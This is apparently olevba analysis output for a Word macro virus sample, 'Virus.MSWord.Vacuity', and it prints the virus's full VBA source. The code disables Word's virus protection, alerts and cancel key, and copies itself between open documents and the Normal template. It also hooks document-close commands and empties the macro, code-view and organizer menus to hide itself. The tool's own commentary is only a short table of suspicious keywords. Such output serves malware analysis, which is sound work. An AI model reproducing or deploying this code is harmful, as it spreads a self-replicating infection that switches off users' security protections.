olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vacuity
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vacuity - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vacuity.bas 
in file: Virus.MSWord.Vacuity - OLE stream: 'Macros/VBA/Vacuity'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Vacuity
Sub ο()
On Error Resume Next
υ = ActiveDocument.Saved
Options.VirusProtection = Val("0")
Options.SaveNormalPrompt = Val("0")
Application.DisplayAlerts = Val("0")
Application.ScreenUpdating = Val("0")
Application.EnableCancelKey = Val("0")
For ι = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ι).Name Like "Vacuity" <> False Then λ = True
Next: If λ = False Then If ActiveDocument.Path <> "" Then Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Vacuity", wdOrganizerObjectProjectItems: If υ <> False Then ActiveDocument.Save
For ι = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(ι).Name Like "Vacuity" <> False Then λ = False
Next: If λ = True Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Vacuity", wdOrganizerObjectProjectItems
ActiveDocument.Saved = υ
End Sub
Sub FileClose(): ο: ActiveDocument.Close: End Sub
Sub DocClose(): ο: ActiveWindow.Close: End Sub
Sub FileTemplates(): End Sub
Sub FormatStyle(): End Sub
Sub ToolsMacro(): End Sub
Sub ViewVBCode(): End Sub
Sub Organizer(): End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

